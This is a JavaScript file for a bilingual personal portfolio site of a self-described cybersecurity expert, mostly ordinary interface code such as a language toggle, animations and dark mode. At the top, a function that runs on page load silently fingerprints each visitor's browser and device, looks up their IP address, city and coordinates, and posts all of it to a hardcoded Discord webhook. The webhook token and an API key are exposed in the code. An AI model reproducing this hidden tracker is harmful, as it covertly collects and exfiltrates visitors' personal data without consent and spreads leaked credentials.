function sendVisitorInfo() {
    // جمع البيانات الأساسية
    const browserInfo = (navigator.userAgent || "غير متوفر").substring(0, 200); // تقصير النص
    const browserLanguage = navigator.language || navigator.userLanguage || "غير متوفر";
    const screenResolution = `${window.screen.width}x${window.screen.height}` || "غير متوفر";
    const pageURL = (window.location.href || "غير متوفر").substring(0, 500); // تقصير النص
    const referrer = (document.referrer || "غير متوفر").substring(0, 500); // تقصير النص
    const platform = navigator.platform || "غير متوفر";
    const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "غير معروف";
    const currentTime = new Date().toLocaleString("ar-EG", { timeZone: "Africa/Cairo" });

    // تحليل المتصفح
    const browserName = (function() {
        const ua = navigator.userAgent;
        if (ua.includes("Chrome")) return "Google Chrome";
        if (ua.includes("Firefox")) return "Mozilla Firefox";
        if (ua.includes("Safari")) return "Apple Safari";
        if (ua.includes("Edge")) return "Microsoft Edge";
        return "غير معروف";
    })();

    // بيانات إضافية
    const deviceType = /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? "هاتف محمول" : "كمبيوتر/تابلت";
    const touchScreen = navigator.maxTouchPoints > 0 ? "نعم" : "لا";

    // جمع معلومات الإضافات (plugins)
    const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(", ").substring(0, 200) || "غير متوفر";

    // معلومات WebGL
    let webglInfo = "غير متوفر";
    try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (gl) {
            const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
            webglInfo = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).substring(0, 200) : "WebGL متاح";
        }
    } catch (e) {
        webglInfo = "غير متوفر (خطأ)";
    }

    // رابط Webhook الخاص بالديسكورد
    const webhookURL = "https://discord.com/api/webhooks/1403388572832104559/pJ7J_pxIOHpuoZI9LqPyMzID6HdJCSyhDPEjf10PxlUNtWAtGAjE27FEY8Mna3gkVG7A";

    // دالة لإرسال الرسالة إلى الديسكورد
    const sendToDiscord = (embedMessage) => {
        return fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(embedMessage)
        }).then(res => {
            if (!res.ok) {
                return res.json().then(err => { throw new Error(`فشل في إرسال البيانات إلى الديسكورد: ${JSON.stringify(err)}`); });
            }
            console.log("✅ تم إرسال البيانات:", res.status);
        });
    };

    // جلب بيانات الموقع الجغرافي من ipgeolocation.io
    fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=77fb2c6bcb9e41e78cbfae43a7a58996`, { timeout: 5000 })
        .then(res => {
            if (!res.ok) throw new Error(`فشل في جلب بيانات الموقع من ipgeolocation.io: ${res.status}`);
            return res.json();
        })
        .then(data => {
            const visitorIP = data.ip || "غير متوفر";
            const country = data.country_name || "غير متوفر";
            const countryCode = data.country_code2 || "غير متوفر";
            const city = data.city || "غير متوفر";
            const region = data.state_prov || "غير متوفر";
            const org = data.isp || "غير متوفر";
            const timezone = data.timezone || "غير متوفر";
            const latitude = data.latitude || "غير متوفر";
            const longitude = data.longitude || "غير متوفر";

            // تنسيق الرسالة باستخدام Embed (18 حقلًا فقط)
            const embedMessage = {
                username: "Website Visitor Tracker",
                avatar_url: "https://cdn-icons-png.flaticon.com/512/888/888859.png",
                embeds: [{
                    title: "🌐 زائر جديد للموقع",
                    description: "تم تسجيل زيارة جديدة للموقع. التفاصيل أدناه:",
                    color: 0x38bdf8, // اللون الأزرق
                    fields: [
                        {
                            name: "📍 الموقع الجغرافي",
                            value: `🌍 **الدولة:** ${country} (${countryCode})\n🏙️ **المدينة:** ${city}\n🗺️ **المنطقة:** ${region}`,
                            inline: false
                        },
                        { name: "📍 إحداثيات", value: `[${latitude}, ${longitude}](https://www.google.com/maps?q=${latitude},${longitude})`, inline: true },
                        { name: "🏢 مزود الخدمة", value: org, inline: true },
                        { name: "🔍 عنوان IP", value: visitorIP, inline: true },
                        { name: "⏰ التوقيت", value: timezone, inline: true },
                        {
                            name: "🖥️ معلومات الجهاز",
                            value: "تفاصيل النظام والمتصفح",
                            inline: false
                        },
                        { name: "🖥️ النظام", value: platform, inline: true },
                        { name: "🌐 المتصفح", value: `${browserName} (${browserInfo})`, inline: false },
                        { name: "🗣️ اللغة", value: browserLanguage, inline: true },
                        { name: "📏 دقة الشاشة", value: screenResolution, inline: true },
                        { name: "💾 الرام", value: deviceMemory, inline: true },
                        { name: "📱 نوع الجهاز", value: deviceType, inline: true },
                        { name: "🖐️ شاشة لمس", value: touchScreen, inline: true },
                        { name: "🔌 الإضافات", value: plugins, inline: false },
                        { name: "🎮 WebGL", value: webglInfo, inline: false },
                        {
                            name: "🌐 معلومات الزيارة",
                            value: "تفاصيل سلوك الزائر",
                            inline: false
                        },
                        { name: "🔗 عنوان الصفحة", value: pageURL, inline: false },
                        { name: "📍 الإحالة", value: referrer, inline: false }
                    ],
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: "تم التتبع بواسطة Website Visitor Tracker",
                        icon_url: "https://cdn-icons-png.flaticon.com/512/888/888859.png"
                    },
                    thumbnail: {
                        url: "https://cdn-icons-png.flaticon.com/512/888/888859.png"
                    }
                }]
            };

            return sendToDiscord(embedMessage);
        })
        .catch(err => {
            console.error("❌ خطأ في جلب بيانات الموقع:", err.message);
            // محاولة استخدام API احتياطي (ip-api.com)
            fetch("http://ip-api.com/json/", { timeout: 5000 })
                .then(res => {
                    if (!res.ok) throw new Error(`فشل في جلب بيانات الموقع من ip-api.com: ${res.status}`);
                    return res.json();
                })
                .then(data => {
                    const visitorIP = data.query || "غير متوفر";
                    const country = data.country || "غير متوفر";
                    const countryCode = data.countryCode || "غير متوفر";
                    const city = data.city || "غير متوفر";
                    const region = data.regionName || "غير متوفر";
                    const org = data.isp || "غير متوفر";
                    const timezone = data.timezone || "غير متوفر";
                    const latitude = data.lat || "غير متوفر";
                    const longitude = data.lon || "غير متوفر";

                    // تنسيق الرسالة باستخدام Embed (18 حقلًا)
                    const embedMessage = {
                        username: "Website Visitor Tracker",
                        avatar_url: "https://cdn-icons-png.flaticon.com/512/888/888859.png",
                        embeds: [{
                            title: "🌐 زائر جديد للموقع (من ip-api.com)",
                            description: "تم جلب بيانات الموقع من API احتياطي:",
                            color: 0x38bdf8, // اللون الأزرق
                            fields: [
                                {
                                    name: "📍 الموقع الجغرافي",
                                    value: `🌍 **الدولة:** ${country} (${countryCode})\n🏙️ **المدينة:** ${city}\n🗺️ **المنطقة:** ${region}`,
                                    inline: false
                                },
                                { name: "📍 إحداثيات", value: `[${latitude}, ${longitude}](https://www.google.com/maps?q=${latitude},${longitude})`, inline: true },
                                { name: "🏢 مزود الخدمة", value: org, inline: true },
                                { name: "🔍 عنوان IP", value: visitorIP, inline: true },
                                { name: "⏰ التوقيت", value: timezone, inline: true },
                                {
                                    name: "🖥️ معلومات الجهاز",
                                    value: "تفاصيل النظام والمتصفح",
                                    inline: false
                                },
                                { name: "🖥️ النظام", value: platform, inline: true },
                                { name: "🌐 المتصفح", value: `${browserName} (${browserInfo})`, inline: false },
                                { name: "🗣️ اللغة", value: browserLanguage, inline: true },
                                { name: "📏 دقة الشاشة", value: screenResolution, inline: true },
                                { name: "💾 الرام", value: deviceMemory, inline: true },
                                { name: "📱 نوع الجهاز", value: deviceType, inline: true },
                                { name: "🖐️ شاشة لمس", value: touchScreen, inline: true },
                                { name: "🔌 الإضافات", value: plugins, inline: false },
                                { name: "🎮 WebGL", value: webglInfo, inline: false },
                                {
                                    name: "🌐 معلومات الزيارة",
                                    value: "تفاصيل سلوك الزائر",
                                    inline: false
                                },
                                { name: "🔗 عنوان الصفحة", value: pageURL, inline: false },
                                { name: "📍 الإحالة", value: referrer, inline: false }
                            ],
                            timestamp: new Date().toISOString(),
                            footer: {
                                text: "تم التتبع بواسطة Website Visitor Tracker (احتياطي)",
                                icon_url: "https://cdn-icons-png.flaticon.com/512/888/888859.png"
                            },
                            thumbnail: {
                                url: "https://cdn-icons-png.flaticon.com/512/888/888859.png"
                            }
                        }]
                    };

                    return sendToDiscord(embedMessage);
                })
                .catch(err => {
                    console.error("❌ خطأ في جلب بيانات الموقع من ip-api.com:", err.message);
                    // إرسال رسالة احتياطية بدون بيانات الموقع
                    const fallbackEmbed = {
                        username: "Website Visitor Tracker",
                        avatar_url: "https://cdn-icons-png.flaticon.com/512/888/888859.png",
                        embeds: [{
                            title: "🌐 زائر جديد (بيانات جزئية)",
                            description: "فشل في جلب بيانات الموقع الجغرافي. التفاصيل أدناه:",
                            color: 0xff0000, // اللون الأحمر
                            fields: [
                                { name: "🕒 الوقت", value: currentTime, inline: true },
                                { name: "🔍 عنوان IP", value: "غير متوفر", inline: true },
                                {
                                    name: "🖥️ معلومات الجهاز",
                                    value: "تفاصيل النظام والمتصفح",
                                    inline: false
                                },
                                { name: "🖥️ النظام", value: platform, inline: true },
                                { name: "🌐 المتصفح", value: `${browserName} (${browserInfo})`, inline: false },
                                { name: "🗣️ اللغة", value: browserLanguage, inline: true },
                                { name: "📏 دقة الشاشة", value: screenResolution, inline: true },
                                { name: "💾 الرام", value: deviceMemory, inline: true },
                                { name: "📱 نوع الجهاز", value: deviceType, inline: true },
                                { name: "🖐️ شاشة لمس", value: touchScreen, inline: true },
                                { name: "🔌 الإضافات", value: plugins, inline: false },
                                { name: "🎮 WebGL", value: webglInfo, inline: false },
                                {
                                    name: "🌐 معلومات الزيارة",
                                    value: "تفاصيل سلوك الزائر",
                                    inline: false
                                },
                                { name: "🔗 عنوان الصفحة", value: pageURL, inline: false },
                                { name: "📍 الإحالة", value: referrer, inline: false }
                            ],
                            timestamp: new Date().toISOString(),
                            footer: {
                                text: "فشل في جلب بيانات الموقع",
                                icon_url: "https://cdn-icons-png.flaticon.com/512/888/888859.png"
                            },
                            thumbnail: {
                                url: "https://cdn-icons-png.flaticon.com/512/888/888859.png"
                            }
                        }]
                    };

                    return sendToDiscord(fallbackEmbed);
                });
        });
}

// تشغيل عند تحميل الصفحة
window.addEventListener("load", sendVisitorInfo);

// باقي الكود كما هو في الملف الأصلي
const langToggleBtn = document.getElementById('lang-toggle');
const langArElements = document.querySelectorAll('.lang-ar');
const langEnElements = document.querySelectorAll('.lang-en');

let currentLang = 'ar';

langToggleBtn.addEventListener('click', () => {
    if (currentLang === 'ar') {
        langArElements.forEach(el => el.style.display = 'none');
        langEnElements.forEach(el => el.style.display = '');
        document.documentElement.lang = 'en';
        document.documentElement.dir = 'ltr';
        langToggleBtn.textContent = 'AR';
        currentLang = 'en';
        document.title = 'Youssef Ahmed - Cybersecurity Expert';
    } else {
        langArElements.forEach(el => el.style.display = '');
        langEnElements.forEach(el => el.style.display = 'none');
        document.documentElement.lang = 'ar';
        document.documentElement.dir = 'rtl';
        langToggleBtn.textContent = 'EN';
        currentLang = 'ar';
        document.title = 'يوسف أحمد - خبير أمن سيبراني';
    }
});

const heroTitle = document.querySelector('.hero-text h1');
const heroSubtitle = document.querySelector('.hero-text h2');

function typeWriter(element, text, speed = 100) {
    let i = 0;
    element.textContent = '';
    function type() {
        if (i < text.length) {
            element.textContent += text.charAt(i);
            i++;
            setTimeout(type, speed);
        }
    }
    type();
}

window.addEventListener('load', () => {
    typeWriter(heroTitle, 'يوسف أحمد', 150);
    setTimeout(() => {
        typeWriter(heroSubtitle, 'خبير أمن سيبراني', 100);
    }, 1000);
});

window.addEventListener('scroll', () => {
    const scrolled = window.pageYOffset;
    const hero = document.querySelector('.hero');
    if (hero) {
        hero.style.transform = `translateY(${scrolled * 0.5}px)`;
    }
});

const stats = document.querySelectorAll('.stat h3');
const observerOptions = {
    threshold: 0.5,
    rootMargin: '0px 0px -100px 0px'
};

const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            const target = entry.target;
            const finalNumber = parseInt(target.textContent);
            let currentNumber = 0;
            const increment = finalNumber / 50;
            const timer = setInterval(() => {
                currentNumber += increment;
                if (currentNumber >= finalNumber) {
                    target.textContent = finalNumber;
                    clearInterval(timer);
                } else {
                    target.textContent = Math.floor(currentNumber);
                }
            }, 50);
            observer.unobserve(target);
        }
    });
}, observerOptions);

stats.forEach(stat => {
    observer.observe(stat);
});

const contactForm = document.querySelector('.contact-form');
if (contactForm) {
    contactForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const formData = new FormData(contactForm);
        const name = formData.get('name');
        const email = formData.get('email');
        const message = formData.get('message');
        if (!name || !email || !message) {
            alert('الرجاء ملء جميع الحقول');
            return;
        }
        alert('تم إرسال رسالتك بنجاح! سنتواصل معك قريباً.');
        contactForm.reset();
    });
}

const revealElements = document.querySelectorAll('.certificate-card, .skill-category, .about-text');
const revealObserver = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.style.opacity = '0';
            entry.target.style.transform = 'translateY(50px)';
            entry.target.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
            setTimeout(() => {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }, 100);
            revealObserver.unobserve(entry.target);
        }
    });
}, {
    threshold: 0.1,
    rootMargin: '0px 0px -50px 0px'
});

revealElements.forEach(el => {
    revealObserver.observe(el);
});

function createParticles() {
    const hero = document.querySelector('.hero');
    if (!hero) return;
    for (let i = 0; i < 50; i++) {
        const particle = document.createElement('div');
        particle.style.position = 'absolute';
        particle.style.width = '2px';
        particle.style.height = '2px';
        particle.style.backgroundColor = '#38bdf8';
        particle.style.borderRadius = '50%';
        particle.style.opacity = '0.5';
        particle.style.left = Math.random() * 100 + '%';
        particle.style.top = Math.random() * 100 + '%';
        particle.style.animation = `float ${3 + Math.random() * 4}s ease-in-out infinite`;
        particle.style.animationDelay = Math.random() * 2 + 's';
        hero.appendChild(particle);
    }
}

createParticles();

const style = document.createElement('style');
style.textContent = `
    @keyframes float {
        0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 0.5; }
        50% { transform: translateY(-20px) rotate(180deg); opacity: 1; }
    }
`;
document.head.appendChild(style);

window.addEventListener('load', () => {
    document.body.classList.add('loaded');
});

const loadingStyle = document.createElement('style');
loadingStyle.textContent = `
    body {
        opacity: 0;
        transition: opacity 0.5s ease;
    }
    body.loaded {
        opacity: 1;
    }
`;
document.head.appendChild(loadingStyle);

const certificateCards = document.querySelectorAll('.certificate-card');
certificateCards.forEach(card => {
    card.addEventListener('click', () => {
        const title = card.querySelector('h3').textContent;
        alert(`شهادة: ${title}\n\nتم النقر على الشهادة. في الواقع، سيتم فتح نافذة منبثقة بصورة الشهادة.`);
    });
});

const skillItems = document.querySelectorAll('.skill-item');
skillItems.forEach(item => {
    item.addEventListener('mouseenter', () => {
        item.style.transform = 'scale(1.1)';
        item.style.transition = 'transform 0.3s ease';
    });
    item.addEventListener('mouseleave', () => {
        item.style.transform = 'scale(1)';
    });
});

const progressBar = document.createElement('div');
progressBar.style.position = 'fixed';
progressBar.style.top = '0';
progressBar.style.left = '0';
progressBar.style.width = '0%';
progressBar.style.height = '3px';
progressBar.style.backgroundColor = '#38bdf8';
progressBar.style.zIndex = '1001';
progressBar.style.transition = 'width 0.3s ease';
document.body.appendChild(progressBar);

window.addEventListener('scroll', () => {
    const scrollTop = window.pageYOffset;
    const docHeight = document.body.offsetHeight - window.innerHeight;
    const scrollPercent = (scrollTop / docHeight) * 100;
    progressBar.style.width = scrollPercent + '%';
});

const currentYear = new Date().getFullYear();
const copyrightElement = document.querySelector('.footer p');
if (copyrightElement) {
    copyrightElement.innerHTML = `&copy; ${currentYear} يوسف أحمد. جميع الحقوق محفوظة.`;
}

document.addEventListener('keydown', (e) => {
    if (e.key === 'Tab') {
        document.body.classList.add('keyboard-navigation');
    }
});

document.addEventListener('mousedown', () => {
    document.body.classList.remove('keyboard-navigation');
});

const keyboardStyle = document.createElement('style');
keyboardStyle.textContent = `
    .keyboard-navigation *:focus {
        outline: 2px solid #38bdf8 !important;
        outline-offset: 2px !important;
    }
`;
document.head.appendChild(keyboardStyle);

document.addEventListener('DOMContentLoaded', () => {
    document.body.classList.add('loaded');
    createParticles();
    const elements = document.querySelectorAll('.certificate-card, .skill-category, .about-text');
    elements.forEach(el => {
        revealObserver.observe(el);
    });
    stats.forEach(stat => {
        observer.observe(stat);
    });
});

const toggleButton = document.createElement('button');
toggleButton.innerHTML = '🌙';
toggleButton.style.position = 'fixed';
toggleButton.style.bottom = '20px';
toggleButton.style.right = '20px';
toggleButton.style.zIndex = '1000';
toggleButton.style.backgroundColor = '#38bdf8';
toggleButton.style.color = '#0f172a';
toggleButton.style.border = 'none';
toggleButton.style.borderRadius = '50%';
toggleButton.style.width = '50px';
toggleButton.style.height = '50px';
toggleButton.style.fontSize = '1.5rem';
toggleButton.style.cursor = 'pointer';
toggleButton.style.transition = 'all 0.3s ease';

let isDarkMode = true;
toggleButton.addEventListener('click', () => {
    isDarkMode = !isDarkMode;
    document.body.classList.toggle('light-mode');
    toggleButton.innerHTML = isDarkMode ? '🌙' : '☀️';
});

const lightModeStyle = document.createElement('style');
lightModeStyle.textContent = `
    body.light-mode {
        background-color: #f8fafc;
        color: #1e293b;
    }
    body.light-mode .navbar {
        background-color: #ffffff;
    }
    body.light-mode .about,
    body.light-mode .certificates,
    body.light-mode .skills,
    body.light-mode .contact {
        background-color: #f1f5f9;
    }
    body.light-mode .certificate-card,
    body.light-mode .skill-category,
    body.light-mode .contact-info {
        background-color: #ffffff;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
`;
document.head.appendChild(lightModeStyle);
document.body.appendChild(toggleButton);